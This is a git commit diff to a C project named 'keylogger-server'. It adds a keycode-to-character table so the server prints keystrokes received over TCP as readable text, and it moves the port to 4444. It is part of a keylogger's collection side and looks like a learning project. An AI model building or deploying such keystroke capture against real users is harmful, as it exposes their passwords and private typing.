f10cae04b524c8790d7312141f747b84885f8161
Guilherme Martini <guilherme.dcmartini@gmail.com>
2026-03-10 12:21:20 -0300

    traduzindo o código das teclas

--- keylogger-server/server.c
+++ keylogger-server/server.c
@@ -9,6 +9,45 @@
 #include <netinet/in.h>
 #include "protocol.h"
 
+const char* translate_key(int keycode) {
+    static const char *key_map[128] = {
+        [0] = "<RES>", [1] = "<ESC>", [2] = "1", [3] = "2", [4] = "3", 
+        [5] = "4", [6] = "5", [7] = "6", [8] = "7", [9] = "8", 
+        [10] = "9", [11] = "0", [12] = "-", [13] = "=", [14] = "<BACKSPACE>", 
+        [15] = "<TAB>", [16] = "q", [17] = "w", [18] = "e", [19] = "r", 
+        [20] = "t", [21] = "y", [22] = "u", [23] = "i", [24] = "o", 
+        [25] = "p", [26] = "[", [27] = "]", [28] = "\n", [29] = "<LCTRL>",
+        [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g",
+        [35] = "h", [36] = "j", [37] = "k", [38] = "l", [39] = ";",
+        [40] = "'", [41] = "`", [42] = "<LSHIFT>", [43] = "\\", [44] = "z", 
+        [45] = "x", [46] = "c", [47] = "v", [48] = "b", [49] = "n", 
+        [50] = "m", [51] = ",", [52] = ".", [53] = "/", [54] = "<RSHIFT>", 
+        [55] = "<KPASTERISK>", [56] = "<LALT>", [57] = " ", [58] = "<CAPSLOCK>", [59] = "<F1>", 
+        [60] = "<F2>", [61] = "<F3>", [62] = "<F4>", [63] = "<F5>", [64] = "<F6>", 
+        [65] = "<F7>", [66] = "<F8>", [67] = "<F9>", [68] = "<F10>", [69] = "<NUMLOCK>", 
+        [70] = "<SCROLLLOCK>", [71] = "<KP7>", [72] = "<KP8>", [73] = "<KP9>", [74] = "<KPMINUS>", 
+        [75] = "<KP4>", [76] = "<KP5>", [77] = "<KP6>", [78] = "<KPPLUS>", [79] = "<KP1>", 
+        [80] = "<KP2>", [81] = "<KP3>", [82] = "<KP0>", [83] = "<KPDOT>", [84] = "<ZENKAKU>", 
+        [85] = "<102ND>", [86] = "<F11>", [87] = "<F12>", [88] = "<RO>", [89] = "<KATAKANA>", 
+        [90] = "<HIRAGANA>", [91] = "<HENKAN>", [92] = "<KATAKANAHIRAGANA>", [93] = "<MUHENKAN>", [94] = "<KPJPCOMMA>", 
+        [95] = "<KPENTER>", [96] = "<RCTRL>", [97] = "<KPSLASH>", [98] = "<SYSRQ>", [99] = "<RALT>", 
+        [100] = "<LINEFEED>", [101] = "<HOME>", [102] = "<UP>", [103] = "<PAGEUP>", [104] = "<LEFT>", 
+        [105] = "<RIGHT>", [106] = "<END>", [107] = "<DOWN>", [108] = "<PAGEDOWN>", [109] = "<INSERT>", 
+        [110] = "<DELETE>", [111] = "<MACRO>", [112] = "<MUTE>", [113] = "<VOLUMEDOWN>", [114] = "<VOLUMEUP>", 
+        [115] = "<POWER>", [116] = "<KPEQUAL>", [117] = "<KPPLUSMINUS>", [118] = "<PAUSE>", [119] = "<SCALE>", 
+        [120] = "<KPCOMMA>", [121] = "<HANGEUL>", [122] = "<HANJA>", [123] = "<YEN>", [124] = "<LMETA>", 
+        [125] = "<RMETA>", [126] = "<COMPOSE>", [127] = "<STOP>"
+    };
+
+    if (keycode >= 0 && keycode < 128) {
+        if (key_map[keycode] != NULL) {
+            return key_map[keycode];
+        }
+    }
+    
+    return "<UNK>"; 
+}
+
 int main(){
     // cria o ponto de comunicação inicial, devolve um file descriptor
     int server_socketFd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -57,8 +96,10 @@ int main(){
             printf("connection with client was gracefully closed\n"); 
             break; 
         }
-
-        printf("key code: %d | status: %d\n", received_package.key_code, received_package.is_pressed);
+        const char *tchar = translate_key(received_package.key_code);
+        printf("%s", tchar);
+        fflush(stdout);
+        //printf("key code: %d | status: %d\n", received_package.key_code, received_package.is_pressed);
     }
 
     close(client_socketFd);
--- shared/protocol.h
+++ shared/protocol.h
@@ -1,7 +1,7 @@
 #include <stdbool.h>
 #include <arpa/inet.h>
 
-#define SERVER_PORT 12345
+#define SERVER_PORT 4444
 #define BACKLOG 10
 #define MAX_EVENTS 64
 #define KEY_PRESSED 1
